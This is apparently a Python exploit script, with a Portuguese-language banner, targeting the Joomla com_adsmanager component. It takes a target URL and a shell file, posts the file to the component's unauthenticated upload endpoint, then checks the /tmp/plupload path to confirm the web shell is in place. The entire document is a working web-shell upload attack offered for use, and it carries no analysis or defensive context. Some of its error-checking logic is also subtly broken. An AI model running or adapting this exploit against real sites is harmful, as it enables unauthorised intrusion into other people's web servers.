import requests
import sys

x = sys.argv
if len(x) < 6:
    print("""
    __     __          _                  _____                   
    \ \   / /         | |                / ____|                  
     \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
      \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
       | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
       |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
     www.facebook.com/yunkers01/                Recoda nao comedia
Joomla! com_adsmanager exploit | coded by supr3m0 & w4rlo6k

--url = site alvo (http://localhost/joomla_diretorio)
--arquivo = shell (shell.jpg)
--nome = nome do arquivo (index.html)

[-] Nenhum argumento inserido.
    """)
    exit()

if x[1] == "--url":
    url = x[2]
if x[3] == "--arquivo":
    shell = x[4]
if x[5] == "--nome":
    nome = x[6]

if url[:8] != "https://" and url[:7] != "http://":
	print('[-] Tipo de URL invalida.')
	exit()
else:
    print("""
    __     __          _                  _____                   
    \ \   / /         | |                / ____|                  
     \ \_/ /   _ _ __ | | _____ _ __ ___| |     _ __ _____      __
      \   / | | | '_ \| |/ / _ \ '__/ __| |    | '__/ _ \ \ /\ / /
       | || |_| | | | |   <  __/ |  \__ \ |____| | |  __/\ V  V / 
       |_| \__,_|_| |_|_|\_\___|_|  |___/\_____|_|  \___| \_/\_/  
     www.facebook.com/yunkers01/                Recoda nao comedia
Joomla! com_adsmanager exploit | coded by supr3m0 & w4rlo6k

[#] Iniciando exploit(...)
    """)
###################################### TESTA CONEXAO ######################################
testar_conexao = requests.get(url)
try:
    if testar_conexao.status_code == 200:
        print("[=] Site:",url)
        print("[=] Arquivo:",shell)
        print("\n[#] Testando conexao com o diretorio do upload(...)")
    else:
        print("[-] Conexao rejeitada.")
        exit()
except: KeyboardInterrupt, print("")
###################################### INSERINDO EXPLOIT ######################################
"""
 {"jsonrpc" : "2.0", "result" : null, "id" : "id","tmpfile" : "_[RandomNumber]"}
"""
tt = open(shell, "r")
exploit_post = {"file" : tt}
exploit_for = {"name" : nome}
xpl_erro = "erro" or "error" or "invalid" or "invalido" or "falha"
exploit_form = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
shell_path = url + "/tmp/plupload/" + nome
testa_form = requests.get(exploit_form)
if testa_form.status_code == 200:
    print("[#] HTTP OK! | Executando exploit(...)")
else:
    print("[-] HTTP OFF | Nao consegui me conectar a url | Respondeu:",testa_form.status_code)
    exit()
try:
    exploit_conexao = requests.post(exploit_form, data=exploit_for, files=exploit_post)
    if exploit_conexao.status_code == 200:
        if xpl_erro in exploit_conexao.text:
            print("\n[-] Erro ao enviar arquivo :/")
            print(exploit_conexao.text)
        else:
            requisicao_shell = requests.get(shell_path)
            if requisicao_shell.status_code == 200:
                print("\n[+] Exploit executado com sucesso!")
                print("[*] Shell:",shell_path)
            else:
                print("[-] Nao encontrei a shell")
                print(exploit_conexao.text)
    else:
        print("[-] Nao consegui enviar o arquivo.")
except:
    print("")
